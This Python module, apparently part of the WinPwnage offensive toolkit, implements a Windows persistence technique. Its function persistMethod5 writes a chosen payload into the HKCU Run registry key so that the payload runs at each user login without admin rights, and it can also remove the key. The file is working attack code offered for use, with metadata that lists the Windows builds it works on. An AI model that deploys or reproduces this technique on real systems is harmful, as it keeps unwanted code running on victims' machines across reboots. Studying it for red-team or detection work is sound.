from winpwnage.core.prints import *
from winpwnage.core.utils import *

persistMethod5_info = {
	"Description": "Persistence using HKCU run key",
	"Method": "Registry key (HKCU Run) manipulation",
	"Id": "5",
	"Type": "Persistence",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "persistMethod5",
	"Function Payload": True,
}

def persistMethod5(payload, name="", add=True):
	if add:
		if payloads().exe(payload):
			if registry().modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name, value=payloads().exe(payload)[1]):
				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payloads().exe(payload)[1]))
				print_success("Successfully installed persistence, payload will run at login")
			else:
				print_error("Unable to install persistence")
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		if registry().remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name):
			print_success("Successfully removed persistence")
		else:
			print_error("Unable to remove persistence")
			return False